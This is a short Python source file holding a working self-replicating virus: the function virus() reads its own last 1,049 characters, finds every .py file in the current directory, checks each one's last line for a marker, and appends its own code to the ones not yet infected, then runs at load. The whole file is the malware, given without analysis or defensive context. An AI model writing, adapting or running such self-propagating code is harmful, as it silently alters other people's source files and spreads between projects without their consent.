def virus():
    import os

    virus_file = open(__file__, 'r')
    virus_code = virus_file.read()[-1049:]
    #print(virus_code)
    virus_file.close()

    files_list = os.listdir()
    python_files_list = ([filename for filename in files_list 
        if filename[-3:] == '.py'])
    print (python_files_list)

    for filename in python_files_list:
        with open(filename, 'r') as file_for_reading:

            file_last_line = file_for_reading.readlines()[-1]
            print (filename, end=' ')

            if 'virus()' in file_last_line :
                file_infected = True
                print('File is already infected!!!')
            else:
                file_infected = False
                print('File is not infected yet.')
            file_for_reading.close()

            if not file_infected:
                print('INFECTING IN PROCESS!!!')
                with open(filename, 'a') as file_for_appending:
                    file_for_appending.write(virus_code)
                    file_for_appending.close()
virus()
